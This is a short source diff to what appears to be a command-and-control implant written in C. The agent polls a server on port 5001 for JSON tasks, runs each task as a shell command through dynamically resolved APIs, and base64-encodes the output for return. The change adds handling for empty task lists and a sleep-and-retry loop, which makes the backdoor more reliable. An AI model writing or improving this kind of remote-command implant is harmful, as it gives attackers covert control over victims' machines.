@@ -790,6 +790,11 @@ CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** uuid)
     CHAR* token = myStrtok(tmpJson, delim, FALSE);
     CHAR blacklist[] = { '[', ']', '\0' };
 
+    if (tmpJson[0] == '[' && tmpJson[1] == ']')
+    {
+        return NULL;
+    }
+
     // SKIP [ and ]
     for (int i=0; i<=myStrlenA(blacklist)-1; i++)
     {
@@ -944,10 +949,10 @@ void myMain()
     WCHAR* fullPath = myConcatW(api, tasksPath, uuid);
     INTERNET_PORT port = 5001;
 
-    CHAR* jsonResponse;
+    CHAR* jsonResponse = NULL;
     CHAR* taskId = { 0 };
     CHAR* agentUuid = { 0 };
-    CHAR* task;
+    CHAR* task = NULL;
     CHAR* taskOutput;
     CHAR* b64EncodedOutput;
     DWORD b64EncodedOutputSize;
@@ -973,6 +978,13 @@ void myMain()
         }
 
         task = readJsonTask(api, jsonResponse, &taskId, &agentUuid);
+
+        if (task == NULL)
+        {
+            ((SLEEP)api->Sleep)(3000);
+            continue;
+        }
+
         taskOutput = myTrimB(api, ((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput), '\n');
 
         ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, NULL, &b64EncodedOutputSize);
